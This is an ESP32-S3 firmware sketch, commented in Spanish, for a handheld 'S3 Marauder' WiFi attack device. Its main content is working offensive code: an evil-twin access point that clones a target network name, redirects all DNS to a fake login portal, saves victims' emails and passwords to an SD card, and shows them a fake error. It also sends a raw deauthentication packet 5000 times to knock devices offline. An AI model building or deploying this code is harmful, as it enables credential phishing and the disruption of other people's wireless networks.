#include <TFT_eSPI.h>
#include <WiFi.h>
#include <SD.h>
#include <SPI.h>
#include <USB.h>
#include <USBMSC.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include "touch.h"

// --- Configuración de Pines Hardware ESP32-S3 ---
#define SD_MISO 39
#define SD_MOSI 40
#define SD_SCLK 38
#define SD_CS   47

TFT_eSPI tft = TFT_eSPI();
USBMSC msc;
SPIClass sdSPI(FSPI);
DNSServer dnsServer;
WebServer server(80);

// --- Definición de Estados del Sistema ---
enum AppState { 
  MENU_STATE, 
  SCAN_LIST, 
  KEYBOARD_MODE, 
  IP_SCANNER, 
  SNIFFER_MODE, 
  EVIL_AP_MODE, 
  SD_LOGS_MODE, 
  SETTINGS_STATE, 
  USB_MODE 
};
AppState currentState = MENU_STATE;

// --- Variables Globales de Interfaz ---
String inputPass = "";
String targetSSID = "";
int kbPage = 0; // 0: ABC, 1: abc, 2: 123/Símbolos

// --- Diccionarios de Teclado ---
String keysABC = "QWERTYUIOPASDFGHJKLZXCVBNM";
String keysabc = "qwertyuiopasdfghjklzxcvbnm";
String keysNum = "1234567890!@#$%^&*()_+-=[]{}|;:',.<>?";

// --- Variables de Datos y Red ---
String menuItems[] = {"Scan WiFi", "Net IP Scan", "Sniffer RAW", "Evil AP", "SD Logs", "Settings"};
String networks[30];
int networkRSSI[30];
String clients[20];
int networkCount = 0;
int lastClientCount = -1;       // Para refrescar la pantalla solo si hay cambios
String lastCapturedPass = "---"; // Guarda la última clave para mostrarla en vivo
int clientCount = 0;
bool attackRunning = false;
bool sdDetected = false;

// --- Paquete de Desautenticación (Estructura IEEE 802.11 RAW) ---
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 31, 0x00, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00, 
  0x01, 0x00  // Razón: Unspecified
};
// --- Callbacks de Almacenamiento USB (Direct RAW Access) ---
static int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
  if (!sdDetected) return -1;
  return SD.writeRAW(buffer, lba) ? bufsize : -1;
}

static int32_t onRead(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
  if (!sdDetected) return -1;
  return SD.readRAW(buffer, lba) ? bufsize : -1;
}

// --- Funciones de Renderizado de Pantalla ---
void showHeader(String title, uint16_t color = TFT_YELLOW) {
  tft.fillScreen(TFT_BLACK);
  tft.fillRect(tft.width() - 90, 0, 90, 35, TFT_RED);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(tft.width() - 85, 10);
  tft.print("VOLVER");
  tft.setTextColor(color);
  tft.setCursor(10, 10);
  tft.print(title);
  tft.drawLine(0, 38, tft.width(), 38, TFT_WHITE);
}

void drawMenu() {
  currentState = MENU_STATE;
  attackRunning = false;
  WiFi.softAPdisconnect(true);
  dnsServer.stop();
  server.stop();
  esp_wifi_set_promiscuous(false);
  
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN);
  tft.setCursor(10, 10);
  tft.print("S3 MARAUDER | SD: ");
  
  if (SD.begin(SD_CS, sdSPI)) {
    tft.setTextColor(TFT_GREEN); 
    tft.print("OK");
    sdDetected = true;
  } else {
    tft.setTextColor(TFT_RED); 
    tft.print("ERR");
    sdDetected = false;
  }

  for (int i = 0; i < 6; i++) {
    int x = (i < 3) ? 10 : 165;
    int y = 50 + (i % 3) * 62;
    tft.drawRoundRect(x, y, 145, 58, 8, TFT_WHITE);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(x + 12, y + 22);
    tft.print(menuItems[i]);
  }
}
// --- Sistema de Teclado Multi-Página ---
void drawKeyboard() {
  currentState = KEYBOARD_MODE;
  showHeader("PASS: " + inputPass, TFT_GREEN);
  
  // Tabs Superiores (Ajustados para resolución 320x240)
  tft.drawRect(5, 45, 100, 35, (kbPage == 0) ? TFT_CYAN : TFT_WHITE);
  tft.setCursor(40, 58); tft.print("ABC");
  
  tft.drawRect(110, 45, 100, 35, (kbPage == 1) ? TFT_CYAN : TFT_WHITE);
  tft.setCursor(145, 58); tft.print("abc");
  
  tft.drawRect(215, 45, 100, 35, (kbPage == 2) ? TFT_CYAN : TFT_WHITE);
  tft.setCursor(245, 58); tft.print("123#");

  String currentSet;
  if (kbPage == 0) currentSet = keysABC;
  else if (kbPage == 1) currentSet = keysabc;
  else currentSet = keysNum;

  // Dibujo de Teclas Individuales
  for (int i = 0; i < currentSet.length(); i++) {
    int col = i % 10;
    int row = i / 10;
    int kx = 5 + col * 31;
    int ky = 85 + row * 38;
    tft.drawRoundRect(kx, ky, 28, 34, 4, TFT_WHITE);
    tft.setCursor(kx + 9, ky + 10);
    tft.print(currentSet[i]);
  }

  // Botones de Acción (Modernizados y claros)
  tft.fillRect(5, 200, 150, 38, TFT_DARKGREEN);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(35, 212);
  tft.print("CONECTAR");
  
  tft.fillRect(165, 200, 150, 38, TFT_MAROON);
  tft.setCursor(210, 212);
  tft.print("BORRAR");
}

// --- Suite de Ataques y Herramientas ---
void startEvilAP() {
  currentState = EVIL_AP_MODE;
  lastClientCount = -1; 
  lastCapturedPass = "Esperando...";

  WiFi.mode(WIFI_AP);
  IPAddress apIP(192, 168, 4, 1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  // Clonar SSID del scanner o usar genérico
  String ssidToClone = (targetSSID == "") ? "WiFi_Publica_Gratis" : targetSSID;
  WiFi.softAP(ssidToClone.c_str());

  // DNS Spoofer puerto 53 (Redirige TODO a nuestra IP)
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIP);

  showHeader("PORTAL: " + ssidToClone, TFT_RED);
  tft.setCursor(10, 50);
  tft.setTextColor(TFT_CYAN);
  tft.println("Servidor DNS: ACTIVO");
  tft.println("IP Gateway: 192.168.4.1");
  tft.drawLine(10, 130, 310, 130, TFT_DARKGREY);

  // Ruta Principal
  server.on("/", []() {
    if (SD.exists("/index.html")) {
      File f = SD.open("/index.html", "r");
      server.streamFile(f, "text/html");
      f.close();
    } else {
      String h = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head>";
      h += "<body style='font-family:sans-serif;text-align:center;'><h2>Acceso</h2>";
      h += "<form action='/save'>Pass: <input name='p' type='password'><input type='submit'></form></body></html>";
      server.send(200, "text/html", h);
    }
  });

  // Ruta de Captura (Actualiza la pantalla en vivo)
server.on("/save", []() {
  // 1. Extraer los datos del formulario HTML
  String email = server.arg("e"); // Corresponde al name="e" del HTML
  String pass = server.arg("p");  // Corresponde al name="p" del HTML
  
  // 2. Actualizar la variable para mostrar en la pantalla del ESP32
  lastCapturedPass = pass; 

  // 3. Guardar en la tarjeta SD
  File f = SD.open("/passwords.txt", FILE_APPEND);
  if (f) {
    f.println("========== CAPTURA ==========");
    f.println("Email/User: " + email);
    f.println("Password:   " + pass);
    f.println("=============================");
    f.close();
  }

  // 4. Enviar respuesta a la víctima (Simulación de error)
  server.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='3;url=/'></head><body style='background:#0b0b0b;color:white;text-align:center;padding-top:50px;font-family:sans-serif;'><h2>Error de autenticacion</h2><p>El servicio no responde. Reintentando...</p></body></html>");
});
  // REDIRECCIÓN CRÍTICA para que salte el portal en móviles
  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", ""); 
  });

  server.begin();
  attackRunning = true;
}
void startBeaconSniffer() {

  currentState = SNIFFER_MODE;

  showHeader("BEACON SNIFFER -> SD", TFT_MAGENTA);

  tft.setCursor(10, 50);

  tft.println("Escuchando trafico RAW...");

  tft.println("Guardando en /beacons.txt");



  esp_wifi_set_promiscuous(true);

  

  // Capturaremos durante 30 segundos

  unsigned long startMs = millis();

  int capturedCount = 0;



  while (millis() - startMs < 30000) { // 30 segundos de captura

    // Nota: Para un sniffer real se usa un callback, 

    // pero para guardar SSIDs usaremos el scan manual optimizado:

    int n = WiFi.scanNetworks(true, true); // Scan exhaustivo incluyendo ocultas

    

    File f = SD.open("/beacons.txt", FILE_APPEND);

    if(f && n > 0) {

      for (int i = 0; i < n; i++) {

        f.println("SSID: " + WiFi.SSID(i) + " | BSSID: " + WiFi.BSSIDstr(i) + " | CH: " + String(WiFi.channel(i)));

        capturedCount++;

      }

      f.close();

      tft.print(".");

    }

    delay(1000); // Pausa entre barridos de canal

  }



  esp_wifi_set_promiscuous(false);

  tft.println("\n\nCaptura terminada.");

  tft.print("Total guardados: "); tft.println(capturedCount);

  delay(3000);

  drawMenu();

}
void startIPScanner() {
  currentState = IP_SCANNER;
  clientCount = 0;
  showHeader("SCANNER DE RED", TFT_MAGENTA);
  
  IPAddress myIP = WiFi.localIP();
  IPAddress subnet = myIP;
  subnet[3] = 0;
  
  tft.setCursor(10, 45);
  tft.println("Red Local: " + subnet.toString().substring(0, subnet.toString().lastIndexOf('.')) + ".*");
  tft.println("Buscando hosts activos...");
  
  for (int i = 1; i < 255 && clientCount < 18; i++) {
    IPAddress target = subnet;
    target[3] = i;
    if (i % 20 == 0) tft.print(".");
    
    if (WiFi.hostByName(target.toString().c_str(), target)) {
      clients[clientCount] = target.toString();
      clientCount++;
    }
    delay(5);
  }
  
  showHeader("SELECCIONE OBJETIVO", TFT_GREEN);
  for (int i = 0; i < clientCount; i++) {
    int y = 45 + i * 32;
    tft.drawRect(5, y, 310, 30, TFT_WHITE);
    tft.setCursor(15, y + 8);
    tft.print("Dispositivo: " + clients[i]);
  }
}

void performSpecificAttack(String ip) {
  showHeader("DEAUTH INTERRUPT -> " + ip, TFT_RED);
  tft.println("Iniciando ataque persistente...");
  esp_wifi_set_promiscuous(true);
  
  // Aumentamos a 5000 paquetes para desconexiones largas
  for(int i = 0; i < 5000; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    
    // Feedback visual cada 250 paquetes
    if (i % 250 == 0) {
      tft.print("!");
      // Permitir que el sistema respire un poco para no colgar el ESP32
      yield(); 
    }
  }
  
  esp_wifi_set_promiscuous(false);
  tft.setTextColor(TFT_GREEN);
  tft.println("\n\nAtaque finalizado.");
  delay(2000);
  drawMenu();
}
// --- Setup Inicial ---
void setup() {
  Serial.begin(115200);
  tft.init();
  tft.setRotation(1);
  touch_init(tft.width(), tft.height(), tft.getRotation());
  
  sdSPI.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
  SD.begin(SD_CS, sdSPI);
  
  drawMenu();
}

// --- Bucle de Ejecución ---
void loop() {
  if (attackRunning) {
    dnsServer.processNextRequest();
    server.handleClient();

    // --- BLOQUE DE ACTUALIZACIÓN VISUAL EN VIVO ---
    int currentConnected = WiFi.softAPgetStationNum();
    static String oldPass = "";

    // Solo redibujamos si hay cambios para evitar parpadeos
    if (currentConnected != lastClientCount || lastCapturedPass != oldPass) {
      lastClientCount = currentConnected;
      oldPass = lastCapturedPass;

      // Cuadro de Víctimas (Amarillo)
      tft.fillRect(10, 140, 300, 45, TFT_BLACK); 
      tft.drawRoundRect(10, 140, 300, 45, 5, TFT_YELLOW);
      tft.setCursor(25, 155);
      tft.setTextColor(TFT_WHITE);
      tft.print("VICTIMAS: ");
      tft.setTextColor(TFT_RED);
      tft.print(currentConnected);

      // Cuadro de Contraseña (Verde)
      tft.fillRect(10, 190, 300, 45, TFT_BLACK); 
      tft.drawRoundRect(10, 190, 300, 45, 5, TFT_GREEN);
      tft.setCursor(25, 205);
      tft.setTextColor(TFT_WHITE);
      tft.print("LOG: ");
      tft.setTextColor(TFT_GREEN);
      tft.print(lastCapturedPass);
    }
  }

  // A partir de aquí sigue tu código original de "if (touch_touched()) {" ...

  // Manejo de Interacción Táctil
  if (touch_touched()) {
    int tx = touch_last_x;
    int ty = touch_last_y;

    // Lógica del Botón VOLVER (Global)
    if (tx > tft.width() - 90 && ty < 40) {
      if (currentState == USB_MODE) {
        ESP.restart(); // Salir de USB requiere reinicio del Stack
      }
      drawMenu();
      delay(300);
      return;
    }

    // Navegación por Estado
    if (currentState == MENU_STATE) {
      int col = (tx < 160) ? 0 : 1;
      int row = (ty - 50) / 62;
      int idx = (col == 0) ? row : row + 3;

      if (idx == 0) { // Scan WiFi
        showHeader("BUSCANDO REDES...");
        networkCount = WiFi.scanNetworks();
        for(int i=0; i<networkCount && i<30; i++) {
          networks[i] = WiFi.SSID(i);
          networkRSSI[i] = WiFi.RSSI(i);
        }
        currentState = SCAN_LIST;
        showHeader("REDES DISPONIBLES");
        for(int i=0; i<5 && i<networkCount; i++) {
          int y = 45 + i * 40;
          tft.drawRect(5, y, 310, 36, TFT_WHITE);
          tft.setCursor(15, y+10);
          tft.print(networks[i] + " (" + String(networkRSSI[i]) + "dBm)");
        }
      }
      else if (idx == 1) { // IP Scanner
        if(WiFi.status() == WL_CONNECTED) {
          startIPScanner();
        } else {
          showHeader("ERROR", TFT_RED);
          tft.println("Debe conectarse a una red");
          tft.println("WiFi primero.");
          delay(2000);
          drawMenu();
        }
      }
      else if (idx == 2) { // Botón "Sniffer RAW"
        startBeaconSniffer(); // <--- IMPORTANTE: Debe estar entre llaves
      }
      else if (idx == 3) { // Evil AP
        startEvilAP();
      }
      else if (idx == 4) { // SD Logs
        currentState = SD_LOGS_MODE;
        showHeader("CONTRASEÑAS SD");
        File f = SD.open("/passwords.txt");
        if(f) {
          while(f.available() && tft.getCursorY() < 220) {
            tft.println(f.readStringUntil('\n'));
          }
          f.close();
        } else {
          tft.println("Archivo 'passwords.txt' no encontrado.");
        }
      }
      else if (idx == 5) { // Settings
        currentState = SETTINGS_STATE;
        showHeader("CONFIGURACION");
        String opts[] = {"MODO USB MSD", "REFORMAT SD", "BORRAR LOGS", "VOLVER"};
        for(int i=0; i<4; i++) {
          tft.drawRoundRect(20, 50 + i * 45, 280, 40, 5, TFT_BLUE);
          tft.setCursor(40, 65 + i * 45);
          tft.print(opts[i]);
        }
      }
    } 

    else if (currentState == SCAN_LIST) {
      int sel = (ty - 45) / 40;
      if (sel < networkCount) {
        targetSSID = networks[sel];
        inputPass = "";
        drawKeyboard();
      }
    }

    else if (currentState == KEYBOARD_MODE) {
      if (ty > 45 && ty < 80) { // Cambio de Página (Tabs)
        if (tx < 105) kbPage = 0; 
        else if (tx < 210) kbPage = 1; 
        else kbPage = 2;
        drawKeyboard();
      } 
      else if (ty > 85 && ty < 195) { // Teclas
        int c = (tx - 5) / 31;
        int r = (ty - 85) / 38;
        int k = r * 10 + c;
        String currentSet = (kbPage == 0) ? keysABC : (kbPage == 1) ? keysabc : keysNum;
        if(k < currentSet.length()) {
          inputPass += currentSet[k];
          drawKeyboard();
        }
      } 
      else if (ty > 200) { // Botones de Acción
        if(tx < 160) { // Botón Conectar
          showHeader("CONECTANDO...");
          WiFi.begin(targetSSID.c_str(), inputPass.c_str());
          int timer = 0;
          while(WiFi.status() != WL_CONNECTED && timer < 15) {
            delay(1000);
            tft.print(".");
            timer++;
          }
          if(WiFi.status() == WL_CONNECTED) {
            tft.println("\nConectado!");
            delay(1500);
            drawMenu();
          } else {
            tft.println("\nError de contraseña.");
            delay(2000);
            drawKeyboard();
          }
        } else { // Botón Borrar
          if(inputPass.length() > 0) {
            inputPass.remove(inputPass.length()-1);
            drawKeyboard();
          }
        }
      }
    }

    else if (currentState == IP_SCANNER) {
      int sel = (ty - 45) / 32;
      if (sel < clientCount) {
        performSpecificAttack(clients[sel]);
      }
    }

    else if (currentState == SETTINGS_STATE) {
      int sIdx = (ty - 50) / 45;
      if(sIdx == 0) { // USB MSD
        currentState = USB_MODE;
        showHeader("PANTALLA: MODO USB");
        tft.println("SD accesible desde PC.");
        msc.onRead((msc_read_cb)onRead);
        msc.onWrite((msc_write_cb)onWrite);
        msc.begin(SD.cardSize()/512, 512);
        USB.begin();
      } else if(sIdx == 1) { // Format
        uint8_t zero[512];
        memset(zero, 0, 512);
        for(int i=0; i<64; i++) SD.writeRAW(zero, i);
        SD.end(); 
        SD.begin(SD_CS, sdSPI);
        drawMenu();
      }
    }

    while (touch_touched()) delay(10); // Debounce táctil
  }
}